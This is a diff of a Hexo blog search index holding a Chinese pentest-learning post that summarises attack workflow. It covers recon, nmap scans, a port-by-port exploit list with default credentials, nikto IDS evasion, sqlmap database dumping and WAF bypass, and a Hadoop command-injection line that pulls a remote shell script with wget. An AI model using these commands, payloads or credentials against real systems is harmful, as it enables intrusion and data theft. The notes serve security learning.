@@ -1,17 +1,14 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>写在开始</title>
+    <title>博客简介</title>
     <url>/2021/02/14/First/</url>
     <content><![CDATA[<h1 id="这个blog用于记录学习渗透测试的经验"><a href="#这个blog用于记录学习渗透测试的经验" class="headerlink" title="这个blog用于记录学习渗透测试的经验"></a>这个blog用于记录学习渗透测试的经验</h1>]]></content>
-      <tags>
-        <tag>init</tag>
-      </tags>
   </entry>
   <entry>
     <title>渗透流程归纳</title>
     <url>/2021/02/14/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/</url>
-    <content><![CDATA[<h1 id="写在开头："><a href="#写在开头：" class="headerlink" title="写在开头："></a>写在开头：</h1><p>　　<strong>知识面，决定看到的攻击面有多广。</strong><br>　　<strong>知识链，决定发动的杀伤链有多深。</strong><a id="more"></a></p>
+    <content><![CDATA[<p><strong>写在开头：</strong><br>　　<strong>知识面，决定看到的攻击面有多广。</strong><br>　　<strong>知识链，决定发动的杀伤链有多深。</strong><a id="more"></a></p>
 <hr>
 <h1 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a>0x00 信息收集</h1><p>　　从旁观者的角度了解整个WEB应用乃至整个目标的全貌，但是资产是收集不完的，可以边收集，边进行一定程度的测试。信息收集最小的粒度应是<strong>目录</strong>。</p>
 <h2 id="1-目标确认"><a href="#1-目标确认" class="headerlink" title="1.目标确认"></a>1.目标确认</h2><h3 id="1-1域名注册信息"><a href="#1-1域名注册信息" class="headerlink" title="1.1域名注册信息"></a>1.1域名注册信息</h3><p>　　　　<strong>通过如下步骤确认目标所有者信息：</strong><br>　　　　　　Whois 目标域名/主机名：whois example.com<br>　　　　　　解析目标域名/主机名的IP地址：dig +short example.com<br>　　　　　　获取域名的详细解析过程：dig +trace example.com<br>　　　　　　后续用于字典制作和进一步收集目标信息的基础<br>　　　　<br>　　　　<strong>获取真实IP：</strong><br>　　　　　　浏览器切换手机模式，可能是真实ip，公众号、小程序中的资产也可能对应真实ip。<br>　　　　<br>　　　　<strong>验证是否存在CDN</strong><br>　　　　　　方法1：<br>　　　　　　使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一多半是使用了CDN， 多地 Ping 网站有：<br>　　　　　　<a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a><br>　　　　　　<a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a><br>　　　　　　<a href="http://ce.cloud.360.cn/">http://ce.cloud.360.cn/</a><br>　　　　　　方法2：<br>　　　　　　试用nslookup进行检测，如果返回域名解析对应多个IP，那么多半是试用了CDN.<br>　　　　　　nslookup example.com<br>　　　　　　方法3:<br>　　　　　　在线工具查看是否存在CDN，可以参考以下站点:<br>　　　　　　<a href="http://www.cdnplanet.com/tools/cdnfinder">http://www.cdnplanet.com/tools/cdnfinder</a><br>　　　　　　<a href="http://www.ipip.net/ip.html">http://www.ipip.net/ip.html</a><br>　　　　<br>　　　　<strong>绕过CDN查找网站真实IP</strong><br>　　　　　　1.查询历史DNS记录(ip的历史解析域名，域名的历史解析ip)<br>　　　　　　查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：<br>　　　　　　<a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a><br>　　　　　　<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a><br>　　　　　　<a href="https://censys.io/ipv4?q=baidu.com">https://censys.io/ipv4?q=baidu.com</a><br>　　　　　　非常牛逼的IP记录站，还能分析内链之类找出可能的IP地址，此外还会记录历史。<br>　　　　　　viewdns.info</p>
@@ -63,6 +60,124 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script&#x3D;auth 192.168.137.*</span><br><span class="line">负责处理鉴权证书（绕开鉴权）的脚本,也可以作为检测部分应用弱口令</span><br><span class="line"></span><br><span class="line">nmap --script&#x3D;brute 192.168.137.*</span><br><span class="line">提供暴力破解的方式  可对数据库，smb，snmp等进行简单密码的暴力猜解</span><br><span class="line"></span><br><span class="line">nmap --script&#x3D;default 192.168.137.* 或者 nmap -sC 192.168.137.*</span><br><span class="line">默认的脚本扫描，主要是搜集各种应用服务的信息，收集到后，可再针对具体服务进行攻击</span><br><span class="line"></span><br><span class="line">nmap --script&#x3D;vuln 192.168.137.*</span><br><span class="line">检查是否存在常见漏洞</span><br><span class="line"></span><br><span class="line">nmap -n -p445 --script&#x3D;broadcast 192.168.137.4</span><br><span class="line">在局域网内探查更多服务开启状况</span><br><span class="line"></span><br><span class="line">nmap --script external 202.103.243.110</span><br><span class="line">利用第三方的数据库或资源，例如进行whois解析</span><br><span class="line"></span><br><span class="line">nmap --script banner ip</span><br><span class="line">nmap -p port -sV ip</span><br><span class="line">获取软件版本信息</span><br><span class="line"></span><br><span class="line">nmap -O ip</span><br><span class="line">操作系统信息，版本</span><br><span class="line"></span><br><span class="line">nmap -A -v ip</span><br><span class="line">完整信息获取</span><br><span class="line"></span><br><span class="line">-sN;-sF;-sX </span><br><span class="line">隐蔽扫描</span><br><span class="line">　　-sN是Null扫描,是通过发送非常规的TCP通信数据包进行探测</span><br><span class="line">　　nmap -sN 127.0.0.1</span><br><span class="line">　　-sF是FIN扫描,当我们使用TCP SYN扫描时可能会被目标主机的防火墙发现,会阻止SYN数据包</span><br><span class="line">　　,这时我们使用TCP FIN扫描方式会有很好的穿透效果.</span><br><span class="line">　　nmap -sF 127.0.0.1</span><br><span class="line"></span><br><span class="line">扫描前1000号TCP端口</span><br><span class="line">nmap 192.168.100.2</span><br><span class="line"></span><br><span class="line">Ping扫描8个本地主机(按ARP、ICMP、TCP 80的顺序)</span><br><span class="line">nmap –sP 192.168.100.0-7</span><br><span class="line"></span><br><span class="line">扫描80,443端口</span><br><span class="line">nmap -p 80,443 192.168.100.2</span><br><span class="line"></span><br><span class="line">扫描前1000号TCP端口，OS指纹，服务，然后运行一个NSE脚本</span><br><span class="line">sudo nmap -A 192.168.100.2</span><br><span class="line"></span><br><span class="line">扫描全部65535个TCP端口，OS指纹，服务，然后运行一个NSE脚本</span><br><span class="line">sudo nmap –A –p- 192.168.100.2</span><br><span class="line"></span><br><span class="line">扫描前1000号UDP端口</span><br><span class="line">sudo nmap -sU 192.168.100.2</span><br><span class="line"></span><br><span class="line">扫描所有65535个UDP端口</span><br><span class="line">sudo nmap -sU –p- 192.168.100.2</span><br><span class="line"></span><br><span class="line">扫描所有65535个UDP端口，并获取服务、OS指纹，之后运行一些NSE脚本</span><br><span class="line">sudo nmap –sU -p- -A 192.168.100.2</span><br></pre></td></tr></table></figure>
 <p><strong>nmap脑图备查</strong>:见笔记</p>
 <h3 id="1-2常见端口漏洞利用"><a href="#1-2常见端口漏洞利用" class="headerlink" title="1.2常见端口漏洞利用"></a>1.2常见端口漏洞利用</h3><p>　　快速扫描：<br>　　Masscan -p80,800 ip –rate=10000<br>21 / FTP<br>　　匿名/暴力破解<br>　　拒绝服务<br>22 / SSH<br>　　暴力破解<br>23 / telnet<br>　　Winbox(CVE-2018-14847)<br>　　<a href="https://github.com/BasuCert/WinboxPoC">https://github.com/BasuCert/WinboxPoC</a><br>　　弱口令 / 暴力破解<br>161 / snmp<br>　　弱口令<br>　　<a href="https://blog.csdn.net/archersaber39/article/details/78932252">https://blog.csdn.net/archersaber39/article/details/78932252</a><br>389 / ladp<br>　　匿名访问<br>　　<a href="https://www.cnblogs.com/persuit/p/5706432.html">https://www.cnblogs.com/persuit/p/5706432.html</a><br>　　ladp注入<br>　　<a href="http://www.4hou.com/technology/9090.html">http://www.4hou.com/technology/9090.html</a><br>　　<a href="https://www.freebuf.com/articles/web/149059.html">https://www.freebuf.com/articles/web/149059.html</a><br>443 / ssl<br>　　openssl心脏出血<br>　　<a href="https://paper.seebug.org/437/">https://paper.seebug.org/437/</a><br>　　<a href="http://www.anquan.us/static/drops/papers-1381.html">http://www.anquan.us/static/drops/papers-1381.html</a><br>　　<a href="https://www.freebuf.com/sectool/33191.html">https://www.freebuf.com/sectool/33191.html</a><br>445 / smb<br>　　win10拒绝服务<br>　　永恒之蓝RCE<br>875 / rsync<br>　　匿名访问<br>　　<a href="http://www.anquan.us/static/bugs/wooyun-2016-0190815.html">http://www.anquan.us/static/bugs/wooyun-2016-0190815.html</a><br>　　<a href="https://paper.seebug.org/409/">https://paper.seebug.org/409/</a><br>　　<a href="http://www.91ri.org/11093.html">http://www.91ri.org/11093.html</a><br>1433 / mssql<br>　　暴力破解<br>　　<a href="http://www.anquan.us/static/drops/tips-12749">http://www.anquan.us/static/drops/tips-12749</a>.　　html<br>　　<a href="https://www.seebug.org/appdir/Microsoft%20SQL%20Server">https://www.seebug.org/appdir/Microsoft%20SQL%20Server</a><br>1521 / oracle<br>　　暴力破解<br>　　<a href="https://www.exploit-db.com/exploits/33084">https://www.exploit-db.com/exploits/33084</a><br>2601 / zebra<br>　　<a href="http://www.anquan.us/static/bugs/wooyun-2013-047409.html">http://www.anquan.us/static/bugs/wooyun-2013-047409.html</a><br>3128 / squid<br>3306 / mysql<br>　　RCE<br>　　<a href="http://www.91ri.org/17511.html">http://www.91ri.org/17511.html</a><br>　　CVE-2015-0411<br>　　hash破解<br>　　<a href="https://www.freebuf.com/column/153561.html">https://www.freebuf.com/column/153561.html</a><br>　　waf绕过<br>　　<a href="https://www.freebuf.com/articles/web/155570.html">https://www.freebuf.com/articles/web/155570.html</a><br>　　general_log_file getshell<br>　　<a href="https://www.freebuf.com/column/143125.html">https://www.freebuf.com/column/143125.html</a><br>　　提权<br>　　<a href="http://www.91ri.org/16540.html">http://www.91ri.org/16540.html</a><br>3312 / kangle<br>　　getshell<br>　　<a href="https://www.secpulse.com/archives/23927.html">https://www.secpulse.com/archives/23927.html</a><br>3389 / rdp<br>　　shift 放大镜 输入法绕过 guest用户<br>　　永恒之蓝(ESTEEMAUDIT)<br>　　<a href="https://www.freebuf.com/articles/system/132171.html">https://www.freebuf.com/articles/system/132171.html</a><br>　　<a href="https://www.anquanke.com/post/id/86328">https://www.anquanke.com/post/id/86328</a><br>　　ms12-020<br>　　<a href="https://blog.csdn.net/meyo_leo/article/details/77950552">https://blog.csdn.net/meyo_leo/article/details/77950552</a><br>4440 / rundeck<br>　　<a href="https://www.secpulse.com/archives/29500.html">https://www.secpulse.com/archives/29500.html</a><br>4848 / glassfish<br>　　文件读取<br>　　<a href="https://www.secpulse.com/archives/42277.html">https://www.secpulse.com/archives/42277.html</a><br>　　<a href="https://www.anquanke.com/post/id/85948">https://www.anquanke.com/post/id/85948</a><br>　　GlassFish2 / admin:admin GlassFish3,4 / 如果管理员不设置帐号本地会自动登录,远程访问会提示配置错误<br>5432 / PostgreSQL<br>　　RCE<br>　　<a href="https://www.cnblogs.com/KevinGeorge/p/8521496.html">https://www.cnblogs.com/KevinGeorge/p/8521496.html</a><br>　　<a href="https://www.secpulse.com/archives/69153.html">https://www.secpulse.com/archives/69153.html</a><br>　　默认账号postgres<br>　　参考<br>　　<a href="http://www.91ri.org/13070.html">http://www.91ri.org/13070.html</a><br>　　<a href="http://www.91ri.org/6507.html">http://www.91ri.org/6507.html</a><br>5672,15672,4369,25672  / RabbitMQ<br>　　（guest/guest）<br>5900 / VNC<br>　　<a href="https://www.seebug.org/appdir/RealVNC">https://www.seebug.org/appdir/RealVNC</a><br>5984 / CouchDB<br>　　<a href="http://xxx:5984/_utils/">http://xxx:5984/_utils/</a><br>6082 / varnish<br>　　CLI 未授权<br>　　<a href="https://www.secpulse.com/archives/10681.html">https://www.secpulse.com/archives/10681.html</a><br>6379 / redis<br>　　Redis未授权<br>　　　ssh publickey<br>　　　crontab<br>　　　webshell<br>　　　反序列化<br>　　　开机自启文件夹写bat<br>　　　参考<br>　　　<a href="https://www.freebuf.com/column/170710.html">https://www.freebuf.com/column/170710.html</a><br>7001,7002 / WebLogic<br>　　默认弱口令<br>　　weblogic/weblogic ,weblogic/welcom ,weblogic/welcom1,weblogic1/weblogic<br>　　反序列<br>　　CVE-2018-2628<br>　　<a href="https://www.freebuf.com/articles/web/169770.html">https://www.freebuf.com/articles/web/169770.html</a><br>　　<a href="https://www.seebug.org/appdir/WebLogic">https://www.seebug.org/appdir/WebLogic</a><br>9200,9300 / elasticsearch<br>　　CVE-2015-1427<br>　　<a href="http://www.anquan.us/static/drops/papers-5142.html">http://www.anquan.us/static/drops/papers-5142.html</a><br>　　CVE-2018-17246<br>　　<a href="https://www.seebug.org/vuldb/ssvid-97730">https://www.seebug.org/vuldb/ssvid-97730</a><br>　　参考<br>　　<a href="https://www.seebug.org/search/?keywords=elasticsearch">https://www.seebug.org/search/?keywords=elasticsearch</a><br>9000 / fcgi<br>　　<a href="https://paper.seebug.org/289/">https://paper.seebug.org/289/</a><br>9043 / WebSphere<br>　　Websphere8.5<br>　　<a href="https://localhost:9043/ibm/console/logon.jsp">https://localhost:9043/ibm/console/logon.jsp</a><br>　　Websphere6-7<br>　　<a href="http://localhost:9043/ibm/console">http://localhost:9043/ibm/console</a><br>　　后台未授权，登录后可部署WAR包<br>　　SOAP服务有反序列化<br>　　弱口令：admin / password<br>11211 / memcache<br>　　未授权<br>　　UDP反射<br>　　<a href="https://shockerli.net/post/memcached-udp-reflection-attack-bug/">https://shockerli.net/post/memcached-udp-reflection-attack-bug/</a><br>27017,27018 / Mongodb<br>　　未授权<br>　　注入<br>　　<a href="https://www.anquanke.com/post/id/83763">https://www.anquanke.com/post/id/83763</a><br>　　phpMoAdmin RCE<br>　　<a href="https://www.aqniu.com/threat-alert/6978.html">https://www.aqniu.com/threat-alert/6978.html</a><br>50000 / SAP<br>　　 SAP命令执行<br>　　<a href="https://www.secpulse.com/archives/20204.html">https://www.secpulse.com/archives/20204.html</a><br>50070,50030 / hadoop<br>　　未授权<br>　　<a href="https://www.freebuf.com/vuls/173638.html">https://www.freebuf.com/vuls/173638.html</a><br>　　命令执行<br>　　host:50060/pstack?pid=123|wget <a href="http://somehost/shell.sh">http://somehost/shell.sh</a><br>　　<a href="https://www.seebug.org/search/?keywords=hadoop">https://www.seebug.org/search/?keywords=hadoop</a><br>　　其他<br>　　<a href="http://www.91ri.org/15441.html">http://www.91ri.org/15441.html</a></p>
+<h3 id="1-3WAF及bypass"><a href="#1-3WAF及bypass" class="headerlink" title="1.3WAF及bypass"></a>1.3WAF及bypass</h3><p>　　探测WAF<br>　　Nmap探测WAF有两种脚本，<br>　　一种是http-waf-detect，一种是http-waf-fingerprint。<br>　　<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">　　nmap -p port --script&#x3D;http-waf-detect ip</span><br></pre></td></tr></table></figure><br>　　<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">　　wafw00f -a example.com</span><br></pre></td></tr></table></figure><br>　　<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">　　sqlmap-u “http:&#x2F;&#x2F;www.vxxxx.org&#x2F;ex.php?id&#x3D;1” --identify-waf</span><br></pre></td></tr></table></figure><br>　　bypass:<br>　　手工注入，详见笔记</p>
+<h3 id="1-4目录、后台和敏感路径文件扫描"><a href="#1-4目录、后台和敏感路径文件扫描" class="headerlink" title="1.4目录、后台和敏感路径文件扫描"></a>1.4目录、后台和敏感路径文件扫描</h3><p>　　御剑目录（土司专版，笔记里有）、后台扫描（图片属性地址暴露），<br>　　完善目录和账密字典方法：<br>　　　　基础字典包合并去重</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">　　dymerge.py -u</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">　　python pydictor.py -tool uniqbiner &#x2F;my&#x2F;dict&#x2F;dirpath --output uniq.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">　　python pydictor.py -tool uniqifer &#x2F;tmp&#x2F;dicts.txt --output &#x2F;tmp&#x2F;uniq.txt</span><br></pre></td></tr></table></figure>
+<h2 id="2-人工浏览-逐个请求burp"><a href="#2-人工浏览-逐个请求burp" class="headerlink" title="2.人工浏览\逐个请求burp"></a>2.人工浏览\逐个请求burp</h2><p>　　非常重要,有必要手动去浏览每个页面，点击页面上每一个跳转，这样在Burp的sitemap里面就可以出现这些请求和响应。<br>　　图片后台地址\图片后面的信息<br>　　跳转参数\奇怪的参数<br>　　泄露邮箱等社工信息<br>　　业务逻辑\架构</p>
+<h2 id="3-自动化"><a href="#3-自动化" class="headerlink" title="3.自动化"></a>3.自动化</h2><p>　　自动化渗透测试框架:(待补充)<br>　　Sn1per<br>　　Ary<br>　　自动化信息收集效率较高，从github上多找一找，也可以自己写</p>
+<h1 id="0x03-漏洞挖掘"><a href="#0x03-漏洞挖掘" class="headerlink" title="0x03 漏洞挖掘"></a>0x03 漏洞挖掘</h1><h2 id="1-漏洞扫描工具"><a href="#1-漏洞扫描工具" class="headerlink" title="1.漏洞扫描工具"></a>1.漏洞扫描工具</h2><p>　　注意:登录类网站扫描要带cookies扫才能扫到</p>
+<h3 id="1-1Nikto-Web服务漏洞扫描器"><a href="#1-1Nikto-Web服务漏洞扫描器" class="headerlink" title="1.1Nikto Web服务漏洞扫描器"></a>1.1Nikto Web服务漏洞扫描器</h3><p>　　Tips:利用-Format选项来导出特定格式的扫描结果，使扫描结果更容易阅读和分析。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nikto -host http:&#x2F;&#x2F;example.com -output ~&#x2F;nikto.html -Format html</span><br></pre></td></tr></table></figure>
+<pre><code>NIKTO使用方法：
+1、命令：nikto -update #升级，更新插件；
+2、Nikto -list-plugins #查看插件；
+3、Nikto -host http://1.1.1.1 #扫描目标：域名方式；
+4、Nikto -host http://1.1.1.1 -output #扫描并输出结果
+5、Nikto -host 1.1.1.1 -port 80 #扫描目标：ip地址加端口号
+6、Nikto -host www.baidu.com -port 443 -ssl #扫描https网站
+7、Nikto -host 文件名.txt #批量扫描目标
+8、nmap -p80 192.168.1.0/24 -oG - | nikto -host -      
+#利用nmap扫描开放80端口的IP段并且oG（nmap结果输出并整理）通过管道的方式
+“|”用nikto进行扫描
+9、nikto -host 192.168.0.1 -useproxy http://localhost:8070      
+#利用代理进行扫描
+10、-vhost     
+#当一个网站存在多个端口时可以使用-vhost
+遍历所有网站进行扫描或一个ip对应多个网站
+11、Nikto交互形参数
+
+配置文件：
+路径：/etc/nikto.conf
+User Agent中文名为用户代理，简称 UA，它是一个特殊字符串头，使得服务器能够识别客户使用的操作系统及版本；
+在nikto中最好修改成别的浏览器user agent；
+设置cookie：
+在配置文件中找到cookie进行设置（#STATIC-COOKIE= &quot;cookie1&quot;=&quot;cookie value&quot;;&quot;cookie2&quot;=&quot;cookie val&quot;）
+
+IDS逃避技术：
+主要为了躲避IDS、IPS检测告警-evasion #此参数使用方式（Nikto -host http://1.1.1.1 -evasion 1234）
+逃避方式共8种：
+1、随机url编码，2、自选路径，3、过早结束的URL
+4、优先考虑长随机字符串5、参数欺骗
+6、使用TAB作为命令的分隔符，7、使用变化的URL
+8、使用Windows路径分隔符
+</code></pre>
+<h3 id="1-2AWVS漏扫"><a href="#1-2AWVS漏扫" class="headerlink" title="1.2AWVS漏扫"></a>1.2AWVS漏扫</h3><p>　　这个没什么好说的，破解版到处都是。</p>
+<h3 id="1-3NESSUS"><a href="#1-3NESSUS" class="headerlink" title="1.3NESSUS"></a>1.3NESSUS</h3><p>　　实时更新插件的漏扫，很好用，就是激活流程麻烦。<br>　　<a href="https://www.wuyini.cn/765.html">https://www.wuyini.cn/765.html</a></p>
+<h3 id="1-4Xray自动化自动化的漏洞挖掘"><a href="#1-4Xray自动化自动化的漏洞挖掘" class="headerlink" title="1.4Xray自动化自动化的漏洞挖掘"></a>1.4Xray自动化自动化的漏洞挖掘</h3><p>　　burp+xray：<br>　　　　BurpSuite + Xray 被动扫描配置 - Ritte - 博客园<br>　　或者直接挂浏览器，点到哪里，扫到哪里<br>　　xray+各种漏扫联动</p>
+<h3 id="1-5Fuzz"><a href="#1-5Fuzz" class="headerlink" title="1.5Fuzz"></a>1.5Fuzz</h3><p>　　Fuzz可以发现应用程序中没有被引用但是确实是可以访问的页面。<br>　　Discover Content是Burp中专门用于此目的的工具。<br>　　Burp Intruder也可以通过字典攻击来实施强制浏览(通常是在url参数和文件路径部分进行修改)，爆破、注入等。<br>　　FuzzDB包含一些用于此目的的非常牛逼的字典。</p>
+<h2 id="2-手动挖掘"><a href="#2-手动挖掘" class="headerlink" title="2.手动挖掘"></a>2.手动挖掘</h2><h3 id="2-1SQL注入："><a href="#2-1SQL注入：" class="headerlink" title="2.1SQL注入："></a>2.1SQL注入：</h3><p>　　初步测试：见框就上，加’ “ ) ))% and 1=1 and 1=2　and2-1  or ，<br>　　抓包爆破常用SQL注入payload字典，上burp intruder<br>　　通过搜索引擎，批量查找注入点，详见笔记。<br>　　然后用傀儡注入点批量搜集工具</p>
+<p>　　实操案例：<br>　　sql注入思路（登录界面）和网络常用端口_u011975363的专栏-CSDN博客<br>　　超级SQL注入工具（github）</p>
+<pre><code>sqlmap一把梭：
+注意：命令为kali linux中运行的 （windows中用python sqlmap.py执行）
+
+注入六连：
+1.sqlmap -u  &quot;http://www.xx.com?id=x&quot;    查询是否存在注入点
+2.--dbs         检测站点包含哪些数据库
+3.--current-db    获取当前的数据库名
+4.--tables -D &quot;db_name&quot;  获取指定数据库中的表名 -D后接指定的数据库名称
+5.--columns  -T &quot;table_name&quot; -D &quot;db_name&quot;  获取数据库表中的字段
+6.--dump -C &quot;columns_name&quot; -T &quot;table_name&quot; -D &quot;db_name&quot;  
+获取字段的数据内容
+
+COOKIE注入：
+sqlmap -u &quot;http://www.xx.com/xxx.asp&quot; --cookie &quot;id=XXX   cookie&quot; --level 2  ＼
+cookie注入 后接cookie值
+
+POST注入：
+（1）目标地址http:// www.xxx.com /login.asp
+（2）打开burp代理
+（3）点击表单提交
+（4）burp获取拦截信息（post）
+（5）右键保存文件（.txt）到指定目录下
+（6）运行sqlmap并执行如下命令：
+用例：sqlmap -r okay.txt  -p  username
+// -r表示加载文件(及步骤（5）保存的路径)
+-p指定参数（即拦截的post请求中表单提交的用户名或密码等name参数）
+（7）自动获取表单：--forms自动获取表单
+例如：sqlmap -u www.xx.com/login.asp --forms
+（8）指定参数搜索：--data
+例如:sqlmap -u www.xx.com/login.asp --data &quot;username=1&quot;
+
+常用指令：
+1. --purge      【重新扫描（--purge 删除原先对该目标扫描的记录）
+2. --tables      【获取表名
+3. --dbs         【检测站点包含哪些数据库
+4. --current-db    【获取当前的数据库名
+5. --current-user  【检测当前用户
+6. --is-dba   【判断站点的当前用户是否为数据库管理员
+7. --batch      【默认确认，不询问你是否输入
+8. --search  【后面跟参数 -D -T -C 搜索列（C），表（T）和或数据库名称（D）
+9. --threads 10  【线程，sqlmap线程最高设置为10
+10.--level 3   【sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头
+的值，
+当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高为5
+11.--risk 3  【执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全
+12.-v   【详细的等级(0-6)
+    0：只显示Python的回溯，错误和关键消息。
+    1：显示信息和警告消息。
+    2：显示调试消息。
+    3：有效载荷注入。
+    4：显示HTTP请求。
+    5：显示HTTP响应头。
+    6：显示HTTP响应页面的内容
+13.  --privileges  【查看权限
+14.  --tamper xx.py,cc.py   【防火墙绕过，后接tamper库中的py文件
+15.  --method &quot;POST&quot; --data &quot;page=1&amp;id=2&quot;   【POST方式提交数据
+16.  --threads number　　【采用多线程 后接线程数
+17.  --referer  &quot;&quot;  【使用referer欺骗
+18.  --user-agent &quot;&quot;     【自定义user-agent
+19.  --proxy “目标地址″   【使用代理注入
+
+sqlmap常用路径：
+1. 添加表字段的目录在/usr/share/sqlmap/txt/common-tables.txt
+2. 存放扫描记录的目录在/root/.sqlmap/output
+
+高阶玩法：
+自己写tamper.py
+</code></pre>
+<h3 id="2-2XSS："><a href="#2-2XSS：" class="headerlink" title="2.2XSS："></a>2.2XSS：</h3><p>　　xss漏洞原理分析与挖掘方法 - 知乎<br>　　web漏洞 | XSS（跨站攻击脚本）详解<br>　　XSS汇总<br>　　XSS小结 - 先知社区<br>　　2020跨站点脚本[xss]速查表|雨苁<br>　　XSSer自动化工具<br>　　XSStrike 自动化绕过WAF<br>　　xss payload字典 burp爆破　<br>　　客服对话系统上XSS打cookie<br>　　搭建XSS平台  3s.wf/<br>　　xssor.io</p>
 ]]></content>
       <categories>
         <category>归纳总结</category>
